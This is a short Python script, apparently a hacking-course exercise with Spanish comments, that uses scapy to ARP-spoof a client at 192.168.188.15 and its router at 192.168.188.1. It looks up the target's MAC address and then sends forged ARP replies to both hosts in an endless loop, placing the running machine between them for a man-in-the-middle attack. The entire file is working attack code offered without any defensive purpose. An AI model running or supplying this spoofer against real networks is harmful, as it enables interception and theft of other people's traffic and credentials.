import scapy.all as scapy
import time

# op: Se envia como ARP res no ARP req al ser 2
# pdst: IP de target
# hwdst: MAC address de target
# psrc: Default gateway


def get_target_MAC(target_ip):
    arp_req = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answer_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    found_target = answer_list[0]
    return found_target[0][1].hwsrc


def spoof(target_ip, default_gateway):
    target_MAC = get_target_MAC(target_ip)
    new_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_MAC, psrc=default_gateway)
    scapy.send(new_packet, verbose=False)


sent_packets_count = 0
while True:
    # send packet to client
    spoof("192.168.188.15", "192.168.188.1")
    # send packet to router
    spoof("192.168.188.1", "192.168.188.15")

    sent_packets_count += 2
    print(f"[+]Packets sent {sent_packets_count}")
    time.sleep(2)
